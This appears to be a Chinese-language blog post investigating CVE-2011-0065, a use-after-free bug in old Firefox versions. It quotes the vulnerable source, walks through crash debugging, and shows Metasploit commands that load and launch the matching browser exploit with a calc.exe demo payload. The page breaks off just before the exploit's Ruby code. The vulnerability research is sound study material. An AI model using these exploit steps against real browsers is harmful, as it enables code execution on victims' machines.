<!DOCTYPE html><html lang="en, zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="keywords" content="Blog, Security, Vulnerability, Flaw, Life, Software, Research, Tech, Bug"><meta name="author" content="7erry"><script>!function(){function e(e){const t="dark"===e,c=document.documentElement;c.classList.add(e),c.classList.remove(t?"light":"dark"),c.style.colorScheme=e}const t=function(){try{const e=localStorage.getItem("REDEFINE-THEME-STATUS");if(e){const{isDark:t}=JSON.parse(e);return t?"dark":"light"}}catch(e){}return matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light"}();e(t),matchMedia("(prefers-color-scheme: dark)").addEventListener("change",({matches:t})=>{localStorage.getItem("REDEFINE-THEME-STATUS")||e(t?"dark":"light")}),function(){const e=()=>{const e=document.body;return!!e&&(e.classList.add(t+"-mode"),!0)};if(e())return;const c=new MutationObserver(()=>{e()&&c.disconnect()});c.observe(document.documentElement,{childList:!0,subtree:!0})}()}()</script><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="canonical" href="https://7erryX.github.io/2025/03/03/vulnerability investigation/cve-2011-0065-investigation/"><meta name="robots" content="index,follow"><meta name="googlebot" content="index,follow"><meta name="revisit-after" content="1 days"><meta name="description" content="(v50) 経験に3を加えて,失礼します [中国翻訳] [無修正]"><meta property="og:type" content="article"><meta property="og:title" content="CVE-2011-0065 Investigation"><meta property="og:url" content="https://7erryx.github.io/2025/03/03/Vulnerability%20Investigation/CVE-2011-0065-Investigation/index.html"><meta property="og:site_name" content="7erry"><meta property="og:description" content="(v50) 経験に3を加えて,失礼します [中国翻訳] [無修正]"><meta property="og:locale"><meta property="og:image" content="https://7erryx.github.io/images/default_avatar.png"><meta property="article:published_time" content="2025-03-03T10:53:57.000Z"><meta property="article:modified_time" content="2025-03-03T10:53:57.000Z"><meta property="article:author" content="7erry"><meta property="article:tag" content="Blog, Security, Vulnerability, Flaw, Life, Software, Research, Tech, Bug"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://7erryx.github.io/images/default_avatar.png"><script src="https://www.googletagmanager.com/gtag/js?id=G-RWM51NR8JQ"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-RWM51NR8JQ")</script><link rel="icon" type="image/png" href="/images/favicon.ico" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico"><meta name="theme-color" content="#A31F34"><link rel="shortcut icon" href="/images/favicon.ico"><title>CVE-2011-0065 Investigation | 7erry</title><link rel="stylesheet" href="/fonts/Chillax/chillax.css"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/build/tailwind.css"><link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css"><link rel="stylesheet" href="/fonts/Geist/geist.css"><script src="/js/build/libs/anime.min.js"></script><script id="hexo-configurations">window.config={hostname:"7erryx.github.io",root:"/",language:"en, zh-CN",path:"search.json"},window.theme={articles:{style:{font_size:"16px",line_height:1.5,image_border_radius:"14px",image_alignment:"center",image_caption:!1,link_icon:!0,delete_mask:!0,title_alignment:"left",headings_top_spacing:{h1:"5rem",h2:"4rem",h3:"2.8rem",h4:"2.5rem",h5:"2.2rem",h6:"2rem"}},word_count:{enable:!0,count:!0,min2read:!0},author_label:{enable:!1,auto:!1,list:[]},code_block:{copy:!0,style:"simple",highlight_theme:{light:"github",dark:"github-dark"},font:{enable:!1,family:null,url:null}},toc:{enable:!0,max_depth:3,number:!1,expand:!0,init_open:!0},copyright:{enable:!0,default:"cc_by_nc_sa"},lazyload:!0,pangu_js:!1,recommendation:{enable:!1,title:"推荐阅读",limit:3,mobile_limit:2,placeholder:"/images/recommend.jpg",skip_dirs:[]}},colors:{primary:"#A31F34",secondary:null,default_mode:"light"},global:{fonts:{chinese:{enable:!1,family:null,url:null},english:{enable:!1,family:null,url:null},title:{enable:!1,family:null,url:null}},content_max_width:"1000px",sidebar_width:"210px",hover:{shadow:!0,scale:!1},scroll_progress:{bar:!1,percentage:!0},website_counter:{url:"https://cn.vercount.one/js",enable:!0,site_pv:!0,site_uv:!0,post_pv:!0},single_page:!0,preloader:{enable:!0,custom_message:"7erry's Website"},side_tools:{gear_rotation:!0,auto_expand:!0},open_graph:{enable:!0,image:"/images/default_avatar.png",description:"(v50) 経験に3を加えて,失礼します [中国翻訳] [無修正]"},google_analytics:{enable:!0,id:"G-RWM51NR8JQ"}},home_banner:{enable:!0,style:"fixed",image:{light:"/images/background_light.jpg",dark:"/images/background_dark.jpg"},title:"7erry's Website",subtitle:{text:["君子慎独","君子不器","君子不争","君子不为苛察，不以身假物","君子务本，本立而道生","人有不为也，而后可以有为","胜人者力，自胜者强","问题是思考的钥匙","在伟大的时代，做渺小的贡献","Fall in Love with the Problem, Not the Solution","Do The Right Thing, Do The Thing Right","Lux et veritas","Mens et Manus","Per Aspera Ad Astra","Ends justify the means","取势，明道，优术","Do things right, not things easy"],hitokoto:{enable:!1,show_author:!1,api:"https://v1.hitokoto.cn"},typing_speed:100,backing_speed:80,starting_delay:500,backing_delay:1500,loop:!0,smart_backspace:!0},text_color:{light:"#000",dark:"#fff"},text_style:{title_size:"5.7rem",subtitle_size:"1.9rem",line_height:1.1},custom_font:{enable:!1,family:null,url:null},social_links:{enable:!0,style:"default",links:{github:"https://github.com/7erryX",instagram:null,zhihu:null,twitter:null,email:"w.7erry@qq.com",bilibili:"https://space.bilibili.com/25689965"},qrs:null}},plugins:{feed:{enable:!1},aplayer:{enable:!1,type:"fixed",audios:[{name:null,artist:null,url:null,cover:null,lrc:null}]},mermaid:{enable:!0,version:"9.3.0"}},version:"2.8.5",navbar:{auto_hide:!0,color:{left:"#7ab8cc",right:"#367df7",transparency:35},width:{home:"1200px",pages:"1000px"},links:{Home:{path:"/",icon:"fa-regular fa-house"},Archives:{path:"/archives",icon:"fa-regular fa-archive"},Anime:{path:"/bangumis",icon:"fa-brands fa-youtube"},Cinema:{path:"/cinemas",icon:"fa-solid fa-film"},About:{path:"/about",icon:"fa-regular fa-user"}},search:{enable:!0,preload:!0}},page_templates:{friends_column:2,tags_style:"blur"},home:{sidebar:{enable:!0,position:"left",first_item:"info",announcement:null,show_on_mobile:!0,links:null},article_date_format:"auto",excerpt_length:200,categories:{enable:!0,limit:1},tags:{enable:!1,limit:3}},footerStart:"2020/2/2 20:20:22"},window.lang_ago={second:"%s seconds ago",minute:"%s minutes ago",hour:"%s hours ago",day:"%s days ago",week:"%s weeks ago",month:"%s months ago",year:"%s years ago"},window.data={masonry:!1}</script><link rel="stylesheet" href="/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/fontawesome/brands.min.css"><link rel="stylesheet" href="/fontawesome/solid.min.css"><link rel="stylesheet" href="/fontawesome/regular.min.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div class="progress-bar-container"><span class="pjax-progress-bar"></span></div><style>:root{--preloader-background-color:#fff;--preloader-text-color:#000}@media (prefers-color-scheme:dark){:root{--preloader-background-color:#202124;--preloader-text-color:#fff}}@media (prefers-color-scheme:light){:root{--preloader-background-color:#fff;--preloader-text-color:#000}}@media (max-width:600px){.ml13{font-size:2.6rem!important}}.preloader{display:flex;flex-direction:column;gap:1rem;align-items:center;justify-content:center;position:fixed;padding:12px;top:0;right:0;bottom:0;left:0;width:100vw;height:100vh;background-color:var(--preloader-background-color);z-index:1100;transition:opacity .2s ease-in-out}.ml13{font-size:3.2rem;color:var(--preloader-text-color);letter-spacing:-1px;font-weight:500;font-family:Chillax-Variable,sans-serif;text-align:center}.ml13 .word{display:inline-flex;flex-wrap:wrap;white-space:nowrap}.ml13 .letter{display:inline-block;line-height:1em}</style><div class="preloader"><h2 class="ml13">7erry&#39;s Website</h2><script>var textWrapper = document.querySelector('.ml13');
        // Split text into words
        var words = textWrapper.textContent.trim().split(' ');

        // Clear the existing content
        textWrapper.innerHTML = '';

        // Wrap each word and its letters in spans
        words.forEach(function(word) {
            var wordSpan = document.createElement('span');
            wordSpan.classList.add('word');
            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
            textWrapper.appendChild(wordSpan);
            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
        });

        var animation = anime.timeline({ loop: true })
            .add({
                targets: '.ml13 .letter',
                translateY: [20, 0],
                translateZ: 0,
                opacity: [0, 1],
                filter: ['blur(5px)', 'blur(0px)'],
                easing: "easeOutExpo",
                duration: 1200,
                delay: (el, i) => 300 + 20 * i,
            })
            .add({
                targets: '.ml13 .letter',
                translateY: [0, -20],
                opacity: [1, 0],
                filter: ['blur(0px)', 'blur(5px)'],
                easing: "easeInExpo",
                duration: 1000,
                delay: (el, i) => 15 * i,
                complete: function() {
                    hidePreloader();
                }
            }, '-=700');


        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;

        // If the theme status is not found in local storage, check the preferred color scheme
        if (themeStatus === undefined || themeStatus === null) {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                themeStatus = 'dark';
            } else {
                themeStatus = 'light';
            }
        }

        // Now you can use the themeStatus variable in your code
        if (themeStatus) {
            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
        } else {
            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
            document.documentElement.style.setProperty('--preloader-text-color', '#000');
        }

        window.addEventListener('load', function () {
            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
        });

        function hidePreloader() {
            var preloader = document.querySelector('.preloader');
            preloader.style.opacity = '0';
            setTimeout(function () {
                preloader.style.display = 'none';
            }, 200);
        }</script></div><main class="page-container" id="swup"><div class="main-content-container flex flex-col justify-between min-h-dvh"><div class="main-content-header"><header class="navbar-container px-6 md:px-12"><div class="navbar-content transition-navbar"><div class="left"><a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/"><img src="/images/favicon.ico" class="w-full h-full rounded-xs"> </a><a class="logo-title" href="/">7erry</a></div><div class="right"><div class="desktop"><ul class="navbar-list"><li class="navbar-item"><a href="/"><i class="fa-regular fa-house fa-fw"></i> HOME</a></li><li class="navbar-item"><a href="/archives"><i class="fa-regular fa-archive fa-fw"></i> ARCHIVES</a></li><li class="navbar-item"><a href="/bangumis"><i class="fa-brands fa-youtube fa-fw"></i> ANIME</a></li><li class="navbar-item"><a href="/cinemas"><i class="fa-solid fa-film fa-fw"></i> CINEMA</a></li><li class="navbar-item"><a href="/about"><i class="fa-regular fa-user fa-fw"></i> ABOUT</a></li><li class="navbar-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></li></ul></div><div class="mobile"><div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div><div class="icon-item navbar-bar"><div class="navbar-bar-middle"></div></div></div></div></div><div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between"><ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start"><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/"><span>HOME </span><i class="fa-regular fa-house fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/archives"><span>ARCHIVES </span><i class="fa-regular fa-archive fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/bangumis"><span>ANIME </span><i class="fa-brands fa-youtube fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/cinemas"><span>CINEMA </span><i class="fa-solid fa-film fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/about"><span>ABOUT </span><i class="fa-regular fa-user fa-sm fa-fw"></i></a></li></ul><div class="statistics flex justify-around my-2.5"><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div><div class="label text-third-text-color text-sm">Tags</div></a><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div><div class="label text-third-text-color text-sm">Categories</div></a><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">83</div><div class="label text-third-text-color text-sm">Posts</div></a></div></div><div class="window-mask"></div></header></div><div class="main-content-body transition-fade-up"><div class="main-content"><div class="post-page-container flex relative justify-between box-border w-full h-full"><div class="article-content-container"><div class="article-title relative w-full"><div class="w-full flex items-center pt-6 justify-start"><h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">CVE-2011-0065 Investigation</h1></div></div><div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8"><div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]"><img src="/images/default_avatar.png"></div><div class="info flex flex-col justify-between"><div class="author flex items-center"><span class="name text-default-text-color text-lg font-semibold">7erry</span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-pen-fancy"></i>&nbsp; <span class="desktop">2025-03-03 18:53:57</span> <span class="mobile">2025-03-03 18:53:57</span> <span class="hover-info">Created</span> </span><span class="article-date article-meta-item"><i class="fa-regular fa-wrench"></i>&nbsp; <span class="desktop">2025-03-03 18:53:57</span> <span class="mobile">2025-03-03 18:53:57</span> <span class="hover-info">Updated</span> </span><span class="article-categories article-meta-item"><i class="fa-regular fa-folders"></i>&nbsp;<ul><li><a href="/categories/Vulnerability-Investigation/">Vulnerability Investigation</a>&nbsp;</li></ul></span><span class="article-wordcount article-meta-item"><i class="fa-regular fa-typewriter"></i>&nbsp;<span>3.2k Words</span> </span><span class="article-min2read article-meta-item"><i class="fa-regular fa-clock"></i>&nbsp;<span>17 Mins</span> </span><span class="article-pv article-meta-item"><i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8"><p>Mozilla Firefox 和 SeaMonkey 中的 mChannel 存在释放后重引用漏洞，其利用可导致任意代码执行</p><p>影响范围：</p><p>Mozilla Firefox 1.0 - 3.5.18<br>Mozilla Firefox 3.6 - 3.6.16<br>Mozilla SeaMonkey 1.0 - 2.0.13</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>开启 hpa 调试运行 Firefox.exe 并打开样本后触发 Access Violation 异常而崩溃。栈回溯发现崩溃时的主调函数基本都是 xul.dll 模块中的虚函数。崩溃时的指令位置是一片没什么意义的内存区域，因此先在调用栈的栈顶函数处下断点，到达后查看上下文指令后可根据 C++ 成员函数 this 指针调用约定推测出寄存器 <code>eax</code> 为对象地址，其首部指向了虚表并被赋值给了寄存器 <code>ecx</code>，即寄存器 <code>ecx</code> 存储的值为虚表基地址。崩溃的发生原因为虚表基指针指向了无意义的内存区域。</p><p>《漏洞战争》接下来的分析过程是，从 POC 中发现关键函数 <code>onChannelRedirect</code>，随后在 <code>WinDBG</code> 中搜索该函数，最终会得到不同类里大量的同名函数。在栈回溯结果中能够得到发生崩溃的函数所属的类，借此可以定位到函数 <code>xul!nsObjectLoadingContent::onChannelRedirect</code>。随后对其进行反汇编与静态代码分析。</p><p>不过 Firefox 是开源的，直接阅读其对应 <a href="#reference">源码</a> 即可（反汇编结果很抽象）</p><div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// nsIChannelEventSink</span></span><br><span class="line"><span class="function">NS_IMETHODIMP</span></span><br><span class="line"><span class="function"><span class="title">nsObjectLoadingContent::OnChannelRedirect</span><span class="params">(nsIChannel *aOldChannel,</span></span></span><br><span class="line"><span class="params"><span class="function">                                          nsIChannel *aNewChannel,</span></span></span><br><span class="line"><span class="params"><span class="function">                                          PRUint32    aFlags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// If we&#x27;re already busy with a new load, cancel the redirect</span></span><br><span class="line">  <span class="keyword">if</span> (aOldChannel != mChannel) &#123;</span><br><span class="line">    <span class="keyword">return</span> NS_BINDING_ABORTED;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mClassifier) &#123;</span><br><span class="line">    mClassifier-&gt;<span class="built_in">OnRedirect</span>(aOldChannel, aNewChannel);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  mChannel = aNewChannel; <span class="comment">// Vulnerability</span></span><br><span class="line">  <span class="keyword">return</span> NS_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>在 <code>onChannelRedirect</code> 函数中，当 <code>mChannel</code> 对象未被分配时，将被临时赋予一个新对象值 <code>aNewChannel</code>。Firefox 采取的垃圾回收机制将会在函数调用完毕后回收不再使用的对象，因此函数实参(argument)，局部变量 <code>aNewChannel</code> 将会在函数返回后被垃圾回收，换而言之就是在 Vulnerability 处赋值符号左边的变量 <code>mChannel</code> 的生命周期大于赋值符号右边的变量 <code>aNewChannel</code>，这将导致在函数调用结束后 <code>mChannel</code> 成为悬挂指针</p><div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">nsresult</span></span><br><span class="line"><span class="function"><span class="title">nsObjectLoadingContent::LoadObject</span><span class="params">(nsIURI* aURI,</span></span></span><br><span class="line"><span class="params"><span class="function">                                   PRBool aNotify,</span></span></span><br><span class="line"><span class="params"><span class="function">                                   <span class="type">const</span> nsCString&amp; aTypeHint,</span></span></span><br><span class="line"><span class="params"><span class="function">                                   PRBool aForceLoad)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// From here on, we will always change the content. This means that a</span></span><br><span class="line">  <span class="comment">// possibly-loading channel should be aborted.</span></span><br><span class="line">  <span class="keyword">if</span> (mChannel) &#123;</span><br><span class="line">    <span class="built_in">LOG</span>((<span class="string">&quot;OBJLC [%p]: Cancelling existing load\n&quot;</span>, <span class="keyword">this</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mClassifier) &#123;</span><br><span class="line">      mClassifier-&gt;<span class="built_in">Cancel</span>();</span><br><span class="line">      mClassifier = nsnull;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// These three statements are carefully ordered:</span></span><br><span class="line">    <span class="comment">// - onStopRequest should get a channel whose status is the same as the</span></span><br><span class="line">    <span class="comment">//   status argument</span></span><br><span class="line">    <span class="comment">// - onStopRequest must get a non-null channel</span></span><br><span class="line">    mChannel-&gt;<span class="built_in">Cancel</span>(NS_BINDING_ABORTED); <span class="comment">// USE AFTER FREE</span></span><br><span class="line">    <span class="keyword">if</span> (mFinalListener) &#123;</span><br><span class="line">      <span class="comment">// <span class="doctag">NOTE:</span> Since mFinalListener is only set in onStartRequest, which takes</span></span><br><span class="line">      <span class="comment">// care of calling mFinalListener-&gt;OnStartRequest, mFinalListener is only</span></span><br><span class="line">      <span class="comment">// non-null here if onStartRequest was already called.</span></span><br><span class="line">      mFinalListener-&gt;<span class="built_in">OnStopRequest</span>(mChannel, nsnull, NS_BINDING_ABORTED);</span><br><span class="line">      mFinalListener = nsnull;</span><br><span class="line">    &#125;</span><br><span class="line">    mChannel = nsnull;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">return</span> NS_OK;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>随后，<code>mChannel</code> 将会在 <code>xul!nsObjectLoadingContent::LoadObject</code> 函数中被解引用，进而导致 UAF 漏洞。静态分析的结果可以被动态调试所证实，在 <code>xul!nsObjectLoadingContent::LoadObject</code> 函数处下断点后即可发现 UAF 处引用的对象与 <code>xul!nsObjectLoadingContent::onChannelRedirect</code> 一致，单步跟进后发现虚表指针被修改导致索引虚函数时出错并触发 Access Violation 异常程序崩溃</p><p>要是用 Rust 编写就不会出现这样的漏洞了，令人感慨</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用 MSF 搜索该漏洞的 exp</p><div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf6 &gt; search cve-2011-0065</span><br></pre></td></tr></table></figure></div><p>搜索结果</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                             Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                             ---------------  ----    -----  -----------</span><br><span class="line">   0  exploit/osx/browser/mozilla_mchannel             2011-05-10       normal  No     Mozilla Firefox 3.6.16 mChannel Use-After-Free</span><br><span class="line">   1  exploit/windows/browser/mozilla_mchannel         2011-05-10       normal  No     Mozilla Firefox 3.6.16 mChannel Use-After-Free Vulnerability</span><br><span class="line">   2    \_ target: Automatic                           .                .       .      .</span><br><span class="line">   3    \_ target: Firefox 3.6.16 on Windows XP SP3    .                .       .      .</span><br><span class="line">   4    \_ target: Firefox 3.6.16 on Windows 7 + Java  .                .       .      .</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/browser/mozilla_mchannel</span><br><span class="line">After interacting with a module you can manually set a TARGET with set TARGET &#x27;Firefox 3.6.16 on Windows 7 + Java&#x27;</span><br></pre></td></tr></table></figure></div><p>调用该模块并查看模块详情</p><div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/browser/mozilla_mchannel</span><br><span class="line">msf6 exploit(windows/browser/mozilla_mchannel) &gt; info</span><br></pre></td></tr></table></figure></div><p>模块详情信息</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">       Name: Mozilla Firefox 3.6.16 mChannel Use-After-Free Vulnerability</span><br><span class="line">     Module: exploit/windows/browser/mozilla_mchannel</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line"> Privileged: No</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Normal</span><br><span class="line">  Disclosed: 2011-05-10</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  regenrecht</span><br><span class="line">  Rh0</span><br><span class="line">  mr_me &lt;steventhomasseeley@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">      Id  Name</span><br><span class="line">      --  ----</span><br><span class="line">  =&gt;  0   Automatic</span><br><span class="line">      1   Firefox 3.6.16 on Windows XP SP3</span><br><span class="line">      2   Firefox 3.6.16 on Windows 7 + Java</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  No</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name     Current Setting  Required  Description</span><br><span class="line">  ----     ---------------  --------  -----------</span><br><span class="line">  SRVHOST  *******          yes       The local host or network interface to listen on. This must be an address on the local machine</span><br><span class="line">                                       or ******* to listen on all addresses.</span><br><span class="line">  SRVPORT  8080             yes       The local port to listen on.</span><br><span class="line">  SSL      false            no        Negotiate SSL for incoming connections</span><br><span class="line">  SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">  URIPATH                   no        The URI to use for this exploit (default is random)</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line">  Space: 1024</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module exploits a use after free vulnerability in Mozilla</span><br><span class="line">  Firefox 3.6.16. An OBJECT Element mChannel can be freed via the</span><br><span class="line">  OnChannelRedirect method of the nsIChannelEventSink Interface. mChannel</span><br><span class="line">  becomes a dangling pointer and can be reused when setting the OBJECTs</span><br><span class="line">  data attribute. (Discovered by regenrecht). This module uses heapspray</span><br><span class="line">  with a minimal ROP chain to bypass DEP on Windows XP SP3. Additionlay,</span><br><span class="line">  a windows 7 target was provided using JAVA 6 and below to avoid aslr.</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  https://nvd.nist.gov/vuln/detail/CVE-2011-0065</span><br><span class="line">  OSVDB (72085)</span><br><span class="line">  https://bugzilla.mozilla.org/show_bug.cgi?id=634986</span><br><span class="line">  http://www.mozilla.org/security/announce/2011/mfsa2011-13.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info -d command.</span><br></pre></td></tr></table></figure></div><p>使用该模块生成木马</p><div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/browser/mozilla_mchannel) &gt; <span class="built_in">set</span> payload windows/exec</span><br><span class="line">msf6 exploit(windows/browser/mozilla_mchannel) &gt; <span class="built_in">set</span> CMD calc.exe</span><br><span class="line">msf6 exploit(windows/browser/mozilla_mchannel) &gt; exploit</span><br></pre></td></tr></table></figure></div><p>随后 MSF 将在本地启动 Web Server 并在攻击目标访问时为其恶意 HTML 文件以触发漏洞</p><h2 id="Exploit-分析"><a href="#Exploit-分析" class="headerlink" title="Exploit 分析"></a>Exploit 分析</h2><p>该模块的 exp 位于</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/modules/exploits/windows/browser/mozilla_mchannel.rb</span><br></pre></td></tr></table></figure></div><p>exp 的核心代码为</p><div class="code-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 